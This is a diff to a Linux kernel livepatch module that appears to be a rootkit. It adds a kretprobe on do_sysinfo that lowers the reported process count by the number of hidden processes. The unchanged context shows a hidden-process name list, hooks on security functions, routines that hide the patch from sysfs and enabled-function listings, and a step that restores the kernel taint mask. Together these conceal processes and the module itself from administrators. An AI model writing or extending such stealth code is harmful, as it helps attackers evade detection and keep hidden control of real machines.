@@ -89,7 +89,7 @@ static int force_modules_disabled = 0;
 module_param(force_modules_disabled, int, 0644);
 
 #define MAX_NUM_PROC_NAME 10
-static int num_proc_name = MAX_NUM_PROC_NAME;
+static int num_proc_name = 1;
 static char *hidden_proc_name[MAX_NUM_PROC_NAME] = {"hidden_comm",};
 module_param_array(hidden_proc_name, charp, &num_proc_name, 0644);
 static char exe_buf[PATH_MAX] = {0};
@@ -887,7 +887,6 @@ static struct ftrace_hook hooks[] = {
         HOOK("security_task_getsid", ftrace_security_task_getsid, &real_security_task_getsid),
 };
 
-/* Here we use the entry_hanlder to timestamp function entry */
 static int entry_handler_sys_getpriority(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
         return 0;
@@ -908,13 +907,54 @@ static int ret_handler_sys_getpriority(struct kretprobe_instance *ri, struct pt_
         return 0;
 }
 
-static struct kretprobe krp = {
+struct sysinfo_data {
+	struct sysinfo *info;
+};
+static int entry_handler_do_sysinfo(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+        struct sysinfo_data *data;
+
+        if (!current->mm)
+                return 1;       /* Skip kernel threads */
+
+        data = (struct sysinfo_data *)ri->data;
+        data->info = (struct sysinfo *)regs_get_kernel_argument(regs, 0);
+        return 0;
+}
+
+static int ret_handler_do_sysinfo(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+        struct sysinfo_data *data;
+        unsigned long retval = regs_return_value(regs);
+
+        data = (struct sysinfo_data *)ri->data;
+	if (retval == 0 && data->info) {
+		//pr_info("procs:%u num_proc_name:%d\n", data->info->procs, num_proc_name);
+		data->info->procs -= num_proc_name;
+	}
+
+        return 0;
+}
+
+static struct kretprobe krps[] = {
+	{
 		.kp.symbol_name = "__x64_sys_getpriority",
 		.handler        = ret_handler_sys_getpriority,
 		.entry_handler  = entry_handler_sys_getpriority,
 		.data_size      = 0,
                 .maxactive      = 20,
+	},
+
+	{
+		.kp.symbol_name = "do_sysinfo",
+		.handler        = ret_handler_do_sysinfo,
+		.entry_handler  = entry_handler_do_sysinfo,
+		.data_size      = sizeof(struct sysinfo_data),
+                .maxactive      = 20,
+	},
 };
+
+struct kretprobe *rps[2] = {&krps[0], &krps[1]};
 
 static struct klp_func funcs[] = {
 	{
@@ -1140,7 +1180,8 @@ static int livepatch_init(void)
 		hidden_from_sys_livepatch(&patch);
 		hidden_from_enabled_functions(objs);
 	}
-	register_kretprobe(&krp);
+
+	register_kretprobes(rps, 2);
 
 	restore_tainted_mask();
 
